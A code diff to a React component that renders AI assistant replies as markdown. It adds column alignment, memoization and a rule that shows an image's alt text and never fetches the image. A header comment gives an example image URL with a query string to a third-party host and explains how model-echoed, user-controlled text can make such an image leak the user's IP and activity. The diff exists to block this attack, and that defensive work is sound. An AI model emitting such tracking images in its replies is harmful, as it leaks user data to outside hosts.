@@ -1,3 +1,4 @@
+import { memo } from 'react';
 import Markdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 
@@ -24,12 +25,61 @@ import remarkGfm from 'remark-gfm';
 // anyway with `rel="noreferrer"`, on this repo's standing rule that a state a caller cannot produce
 // is still a state to handle.
 //
+// **`img` is the one element that has to be mapped to something other than itself**, and it was
+// missing from the map until a review of PR #88 found it. The paragraph above is why the rest of
+// this file is relaxed about reachability: an anchor needs a click, so an odd one costs nothing
+// until the user asks for it. An image fires a **network request from the user's browser the moment
+// the bubble paints** - `defaultUrlTransform` filters protocols and says nothing about hosts, so
+// `![](https://third-party/x.png?d=...)` in a reply is a beacon carrying the user's IP, their agent
+// string and the fact that they are reading this screen, to whoever the model echoed. Reachable
+// through a merchant name the user controls. So the mark is never fetched, and the **alt text
+// renders in its place** rather than the node being dropped: swallowing part of an answer in
+// silence is the same mistake `skipHtml` is refused for two paragraphs up.
+//
 // **Route-local rather than in `components/`**, per that folder's rule of three: one consumer.
 //
 // **Not `@tailwindcss/typography`.** That is a ninth dependency for what fifteen class literals
 // do, and `globals.css` is closed to anything but the theme blocks, the font tokens, the
 // field-focus rules and the `-orange` modifiers - so there is nowhere for its `prose` rules to be
 // registered even if it were wanted.
+
+/**
+ * remark-gfm's column alignment, as whole class strings per key.
+ *
+ * **A table's alignment is the model's to choose and it was being thrown away**, which a review of
+ * PR #88 found and which matters more here than it looks: the prompt asks for "a table when you are
+ * comparing several categories or periods", so the common table on this screen is a money table
+ * whose figures the model right-aligns with `| ---: |`. `th` hard-coded `text-left` and both cells
+ * dropped every prop react-markdown passes, so every such column rendered left-aligned.
+ *
+ * The alignment arrives as an inline `style` of `{ textAlign }` - measured against the installed
+ * react-markdown rather than assumed, since `mdast-util-to-hast` sets an `align` *property* and it
+ * is `hast-util-to-jsx-runtime` that turns it into a style. It is **re-expressed as a class** rather
+ * than forwarded: an inline style would win on priority, and this repo's rule is whole Tailwind
+ * literals, which also means the one prop this file lets through from a model's own output is a
+ * three-way enum rather than a style object.
+ *
+ * Note daisyUI's `.table` already sets `text-align: left`, so the `left` arm is the default
+ * restated. It is written out anyway, because a class that is present says what it means where an
+ * absent one is indistinguishable from an oversight - which is how this defect read.
+ */
+const TH_CLASS = {
+  left: 'text-left font-semibold',
+  right: 'text-right font-semibold',
+  center: 'text-center font-semibold',
+} as const;
+
+const TD_CLASS = {
+  left: 'text-left',
+  right: 'text-right',
+  center: 'text-center',
+} as const;
+
+/** The alignment `react-markdown` handed this cell, or `left` for a column that declared none. */
+function cellAlign(style: React.CSSProperties | undefined): keyof typeof TH_CLASS {
+  const align = style?.textAlign;
+  return align === 'right' || align === 'center' ? align : 'left';
+}
 
 /**
  * Whole Tailwind class literals per tag, which is the `ui/categoryColour.ts` convention and is
@@ -107,9 +157,22 @@ const COMPONENTS: Components = {
       <table className="table-zebra table table-sm w-full">{children}</table>
     </div>
   ),
-  th: ({ children }) => <th className="text-left font-semibold">{children}</th>,
-  td: ({ children }) => <td>{children}</td>,
+  th: ({ children, style }) => <th className={TH_CLASS[cellAlign(style)]}>{children}</th>,
+  td: ({ children, style }) => <td className={TD_CLASS[cellAlign(style)]}>{children}</td>,
+
+  // Never fetched - see the header comment. The alt text takes its place so nothing is silently
+  // dropped, and it is `em` rather than a bare string so a reader can tell a described image from
+  // the surrounding prose. An image with no alt renders nothing, because there is nothing to say.
+  img: ({ alt }) => (alt ? <em className="text-base-content/60 italic">{alt}</em> : null),
 };
+
+/**
+ * Module-scope, so the prop is the same array on every render.
+ *
+ * Written inline until a review of PR #88; a fresh array each time is a changed prop, which is the
+ * one thing that would defeat the `memo` below from inside.
+ */
+const REMARK_PLUGINS = [remarkGfm];
 
 /**
  * One assistant reply.
@@ -118,13 +181,23 @@ const COMPONENTS: Components = {
  * export is hook-free and synchronous, and it is only its `MarkdownHooks` sibling that needs the
  * client. (Both are in fact rendered from inside a client component today, so this buys
  * correctness of structure rather than a bundle saving.)
+ *
+ * **`memo` is a requirement rather than a tune-up, and the cost it removes is new to PET-76.** The
+ * bubble was a bare string before this ticket, so a re-render of the list was free. It is a full
+ * unified parse now, and react-markdown caches nothing - `react-markdown/lib/index.js` builds a
+ * fresh processor and re-parses on **every** render. The composer's `draft` is state on
+ * `AssistantChatScreen`, three components above this one, so **every keystroke re-renders every
+ * bubble on screen**: a resumed twenty-turn conversation with a table in it paid twenty markdown
+ * parses per character typed, plus reconciliation of the element trees they produce, on the one
+ * control the user is interacting with. The prop is a single `string`, so memoizing is exact: a
+ * bubble re-renders when its own text changes and at no other time.
  */
-export function AssistantMarkdown({ content }: { content: string }) {
+export const AssistantMarkdown = memo(function AssistantMarkdown({ content }: { content: string }) {
   return (
     <div className="space-y-2">
-      <Markdown remarkPlugins={[remarkGfm]} components={COMPONENTS}>
+      <Markdown remarkPlugins={REMARK_PLUGINS} components={COMPONENTS}>
         {content}
       </Markdown>
     </div>
   );
-}
+});
